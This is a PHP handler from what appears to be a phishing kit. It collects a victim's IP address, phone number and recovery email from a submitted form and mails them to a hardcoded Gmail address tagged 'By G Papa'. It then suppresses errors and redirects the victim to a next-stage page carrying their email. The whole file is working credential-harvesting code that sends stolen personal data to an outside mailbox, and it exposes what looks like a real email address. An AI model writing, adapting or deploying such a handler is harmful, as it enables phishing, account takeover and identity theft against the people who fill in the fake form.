<?php

error_reporting(0);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$email = $_POST['email'];

$ip = getenv("REMOTE_ADDR");
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "--------------PHONE ETC-----------------------\n";
$message .= "phone: ".$_POST['phoneNumber']."\n";
$message .= "recovery: ".$_POST['recEmail']."\n";
$message .= "----------- | By G Papa | -----------\n";
$message .= "\n";
$send = "patrickraymond1113@gmail.com";
$subject = "| PHONE By G Papa | $ip |";
mail($send,$subject,$message);


 header ("Location: go.php?email=".$_POST['email']);

?>